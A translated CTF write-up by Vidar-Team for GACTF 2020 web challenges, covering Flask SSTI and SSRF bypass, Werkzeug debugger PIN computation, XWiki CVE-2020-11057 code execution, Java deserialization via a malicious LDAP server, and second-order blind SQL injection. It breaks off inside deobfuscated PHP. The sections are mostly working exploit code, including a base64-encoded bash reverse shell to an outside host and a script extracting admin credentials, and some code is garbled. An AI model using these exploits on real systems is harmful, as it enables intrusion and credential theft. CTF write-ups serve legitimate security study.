# GACTF 2020 Vidar-Team Writeup
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## web
###  EZFLASK
> flask&flask
python2
    # -*- coding: utf-8 -*-    from flask import Flask, request
    import requests
    from waf import *
    import time
    app = Flask(__name__)
    @app.route('/ctfhint')
    def ctf():
        hint =xxxx # hints
        trick = xxxx # trick
        return trick
    @app.route('/')
    def index():
        # app.txt
    @app.route('/eval', methods=["POST"])
    def my_eval():
        # post eval
    @app.route(xxxxxx, methods=["POST"]) # Secret
    def admin():
        # admin requests
    if __name__ == '__main__':
        app.run(host='0.0.0.0',port=8080)
POST `eval=ctf.__code__.co_consts`  
得到 `(None, 'the admin route :h4rdt0f1nd_9792uagcaca00qjaf', 'too young too simple')`
访问上面拿到的admin路由，POST `admin.__code__.co_names`看到admin方法调用了这些函数`('request',
'form', 'waf_ip', 'waf_path', 'len', 'requests', 'get', 'format', 'text')`
然后waf_ip函数里有这些变量`(None, '0.0', '192', '172', '10.0', '233.233', '1234567890.',
15, '.', 4)`  
经测试，根据上面这些变量猜测waf逻辑为，ip中不能出现`'0.0', '192', '172', '10.0',
'233.233'`、由数字和`.`组成、长度小于15、具有4段
POST `http://124.70.206.91:10009/h4rdt0f1nd_9792uagcaca00qjaf`
`ip=127.1.1.1&port=5000&path=/`
拿到源码
    import flask
    from xxxx import flag
    app = flask.Flask(__name__)
    app.config['FLAG'] = flag
    @app.route('/')
    def index():
        return open('app.txt').read()
    @app.route('/')
    def hack(hack):
        return flask.render_template_string(hack)
    if __name__ == '__main__':
        app.run(host='0.0.0.0',port=5000)
将上述POST的path改为`{{url_for.__globals__.current_app["con"+"fig"]}}`读取`config`得到flag
###  simpleflask
    if name == "":
            return render_template_string("hello world!")
        check(name)
        template = 'hello {}!'.format(name)
        res = render_template_string(template)
        if "flag" in res:
            abort(500, "hacker")
        return res
`name={{.}}` 会触发 Flask 报错，输入正确的 pin 即有 Flask 自带的 shell。
`name={{().__class__.__bases__[0].__subclasses__()}}`  
读文件，构造 pin 码。
`name={{().__class__.__bases__[0].__subclasses__()[434].__init__.__globals__.sys.argv}}`
得到：`['/home/ctf/app.py']`
UUID get _node:  
name={{(). **class**. **bases** [0]. **subclasses** ()[396]. **init**.
__globals__.getnode()}}
machine _id：  
name={{(). **class**. **bases** [0]. **subclasses** ()[458]. **init**.
__globals__ }}
计算出 pin 码
    from itertools import chain
    import hashlib
    probably_public_bits = [
        'root',# username
        'flask.app',# modname
        'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
        '/usr/local/lib/python3.7/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
    ]
    private_bits = [
        '2485378154503',# str(uuid.getnode()),  /sys/class/net/ens33/address
        'a8eb6cac33e701ae867269db5ce80e7f79a0b2aa07d319fcb3e1d7588a7f75d5396d7ae8d223aec387a46e9a16d101a3'# get_machine_id(), /etc/machine-id
    ]
    h = hashlib.md5()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')
    cookie_name = '__wzd' + h.hexdigest()[:20]
    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]
    rv =None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                              for x in range(0, len(num), group_size))
                break
        else:
            rv = num
    print(rv)
拿到 Pin 码后，随便 POST 如：`{{.}}` 导致报错返回 Debug 信息，输入 pin 即可使用控制台。  
执行：
    f = open("/flag")
    f.read()
拿到 Flag。
###  XWiki
`CVE-2020-11057`
> XWiki Platform是法国XWiki公司的一套用于创建Web协作应用程序的Wiki平台。 XWiki Platform
> 7.2版本至11.10.2版本（已在11.3.7版本、11.10.3版本和12.0版本中修复）中存在代码注入漏洞。攻击者可通过编辑个人仪表板利用该漏洞执行python/groovy脚本。
题目版本 11.10.1
按照这篇文章的方法弹 shell 即可：  
    Full path to reproduce:
    1) Create new user on xwiki.org (or myxwiki.org)
    2) Go to profile -> Edit -> My dashboard -> Add gadget
    3) Choose either python or groovy.
    4) Paste following python/groovy code (for unix powered xwiki)
    import os
    print(os.popen("id").read())
    print(os.popen("hostname").read())
    print(os.popen("ifconfig").read())
弹上去后发现`readflag`文件，下载到本地进行逆向
    import re
    from pwn import *
    from Crypto.Util.number import long_to_bytes
    #context.log_level = 'debug'
    p = process('./readflag')
    m = ''
    while True:
        try:
            line = p.recvline().decode()
        except EOFError:
            break
        #print(line)
        if line.startswith('Which number is bigger?'):
            a, b = map(int, re.search(r'\s(\d+)\s\:\s(\d+)\n', line).groups())
            if a  b:
                p.sendline('0')
                m += '0'
            else:
                raise RuntimeError
    #p.interactive()
    p.close()
    print(long_to_bytes(int(m, 2)))
###  say hello to the world
搜已知漏洞的时候搜到 RCE。  
Exploit.java
    public class Exploit {
        static {
            try {
                Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwL3h4eC54eHgueHh4Lnh4eC8yMDAwMCAwPiYx}|{base64,-d}|{bash,-i}");
            } catch (Exception e){
                e.printStackTrace();
            }
        }
执行`javac Exploit.java`。
修改 POC，注意字符串长度要一致，因此服务器开了个两位数的端口：
    import socket
    import time
    import re
    def sendEvilObjData(sock):
        payload = "f1f1000017405557170000010000034df0f0010017405557170000010000033daced0005772e0015717569636b73746172742e466f6f536572766963650003776f6300106a6176612e6c616e672e4f626a656374757200025b42acf317f8060854e002000078700000028d48433027636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e457175616c734265616e92096265616e436c617373036f626a60430f6a6176612e6c616e672e436c61737391046e616d65613029636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e546f537472696e674265616e433029636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e546f537472696e674265616e92096265616e436c617373036f626a62611d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706c431d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706cac07636f6d6d616e640355524c0a64617461536f757263650a726f77536574547970650b73686f7744656c657465640c717565727954696d656f7574076d6178526f77730c6d61784669656c6453697a650b636f6e63757272656e637908726561644f6e6c791065736361706550726f63657373696e670969736f6c6174696f6e08666574636844697209666574636853697a6504636f6e6e02707302727306726f77734d44057265734d440d694d61746368436f6c756d6e730f7374724d61746368436f6c756d6e730c62696e61727953747265616d0d756e69636f646553747265616d0b617363696953747265616d0a6368617253747265616d036d6170096c697374656e65727306706172616d73634e4e1d6c6461703a2f2f3132372e302e302e313a393939392f4578706c6f6974cbec46909090cbf0545492cbe8904e4e4e4e4e56106a6176612e7574696c2e566563746f729a8f8f8f8f8f8f8f8f8f8f56909a03666f6f4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4d136a6176612e7574696c2e486173687461626c655a5191519151915a776300000005000b6170706c69636174696f6e00056d6f74616e000b636c69656e7447726f7570000b64656661756c745f72706300066d6f64756c6500056d6f74616e000776657273696f6e0003312e30000567726f7570000b64656661756c745f727063"
        payload = payload.decode('hex')
        payload = payload.replace('127.0.0.1:9999', 'xx.xx.xx.xx:99')    # change to your host
        sock.send(payload)
    def run(dip,dport):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_addr = (dip, dport)
        sock.connect(server_addr)
        sendEvilObjData(sock)
    run("124.70.166.10",8002)
然后跟着文章描述，在服务器上用 Python 起一个 SimpleHTTPServer
用于获取文件，并将编译后的`Exploit.class`放到目录下，再用 marshalsec 起一个 LDAP 服务。  
运行上述 exp 即可 get shell。
###  carefuleyes
根据提示`/www.zip`下有源码
在上传的文件名插入payload  
在rename.php中，将数据库中的脏数据直接取出，拼入sql语句中，此处可以二次注入
    import requests
    import tqdm
    import time
    out=''
    for num in tqdm.tqdm(range(1,30)):
        for target_char in range(32,126): 
            files = {"upfile": ("1' and if(ascii(substr((select group_concat(username,password) from user where privilege='admin'),{0},1))={1},sleep(2),1) or '.txt".format(str(num), str(target_char)), open("233", "rb"), "text/plain")}
            data = {"newname": "233", "oldname": "1' and if(ascii(substr((select group_concat(username,password) from user where privilege='admin'),{0},1))={1},sleep(2),1) or '".format(str(num), str(target_char))}
            req = requests.post("http://124.71.191.175/upload.php", files=files)
            before_time = time.time()
            req = requests.post("http://124.71.191.175/rename.php", data=data)
            after_time = time.time()
            offset = after_time - before_time
            if offset > 2:
                out += chr(target_char)
                break
    print(out)
然后反序列化
    method = $method;
            $this->args = $args;
        }
    }
    $a = new XCTFGG("login",["XM", "qweqweqwe"]);
    echo urlencode(serialize($a));
###  babyshop
发现 .git 泄露，源码拖下来。
`init.php`手动去混淆后:
    融合();
        }
        function 融合() {
            global $天书,$异闻录,$实物长度,$寻根,$奇语切片,$出窍,$遮天之术,$虚空之数, $实打实在,$虚无缥缈;
            // $虚空之数 = NULL
            $天书=array("阿尔法","喝彩","查理","三角洲","回声","狐步舞","高尔夫球","旅馆","印度","朱丽叶","公斤","利马","麦克","十一月","奥斯卡","爸爸","魁北克","罗密欧","塞拉","探戈","制服","胜利者","威士忌","伦琴射线","扬基","祖鲁");
            $实物长度='strlen';
            $寻根='strpos';
            $奇语切片='str_split';
            $出窍='array_pop';
            $遮天之术='base64_decode';
            $虚空之数=0;
            $实打实在 = true;
            $虚无缥缈 = false;
            $异闻录= '+=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz./0123456789';
        }
    }
    // 上面是加密的构造函数，可以不管
    new 造化之神();
    $千奇百出="余壶血史两恐自扩劫盏铁天";
    $来者无惧="余壶仍灯两恐尽天";
    ini_set('display_errors', 'N');
    $宝物="冻实史畏言秀倾服沃尽天夫";
    class 造齿轮 {
        protected$朝拜圣地;
        protected$贡品;
        protected$圣殿;
        protected$禁地;
        public function __construct() {
            $this->朝拜圣地 = 'storage';
            if(!is_dir($this->朝拜圣地)){
                mkdir($this->朝拜圣地);
            }
            $this->禁地 = array('php', 'flag', 'html', 'htaccess');
        }
        // 检查 Cookie 里是否有黑名单
        public function 挖掘($货物, $食物) {
            foreach($this->禁地 as $元素) {
                if(stripos(@$_COOKIE[$食物], $元素) !== false) {
                    die('invaild ' . $食物);
                    return false;
                }
            }
            $this->圣殿 = session_id();
            return true;
        }
        // 写文件
        public function 种植($货物,$食物) {
            $this->贡品 = $货物;
            return file_put_contents($this->朝拜圣地.'/sess_'.$货物,$食物);
        }
        // 读文件
        public function 收获($货物) {
            $this->贡品=$货物;
            return (string)@file_get_contents($this->朝拜圣地.'/sess_'.$货物);
        }
        public function 总结($货物) {
            global$实物长度,$虚无缥缈;
            if(strlen($this->圣殿) 朝拜圣地.'/note_'.$this->圣殿,$货物)===$虚无缥缈?$虚无缥缈:true;
        }
        public function 归纳() {
            return (string)@file_get_contents($this->朝拜圣地.'/note_'.$this->贡品);